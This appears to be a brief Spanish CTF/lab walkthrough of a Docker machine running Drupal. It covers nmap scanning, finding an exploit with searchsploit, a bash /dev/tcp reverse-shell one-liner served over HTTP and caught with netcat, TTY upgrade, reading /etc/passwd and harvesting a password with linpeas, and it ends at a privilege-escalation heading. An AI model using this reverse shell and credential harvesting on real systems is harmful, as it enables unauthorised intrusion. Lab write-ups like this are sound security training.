### Maquina FindyourStyle

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1

![alt text](image.png)

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80 -vvv -Pn 172.17.0.1

## Entramos en la web:

Me di cuenta que se trata de un CMS Drupal

![alt text](image-1.png)

aplicando whatweb para ver la version:

![alt text](image-2.png)

busque un exploit en searchsploit

![alt text](image-3.png)

descargué el exploit

![alt text](image-4.png)

ejecuté el exploit pero tenía mal control, entonces hice un rev.sh en mi kali con el siguiente codigo:

![alt text](image-5.png)

![alt text](image-6.png)

bash -i >& /dev/tcp/172.17.0.1/443 0>&1

luego levvante un servidor http con python y lo comparti con curl

![alt text](image-7.png)

me puse en escucha con netcat por el puerto 443

tratamiento de la tty

script /dev/null -c bash
ctrl + z
ctrl + z
reset
xterm
export TERM=xterm
export SHELL=bash


hice un cat /etc/passwd | grep bash

![alt text](image-8.png)

usando linpeas

encontramos la password del usuario ballenita

![alt text](image-9.png)

cambiamos al usuario ballenita

![alt text](image-10.png)

## Escalar privilegios

![alt text](image-11.png)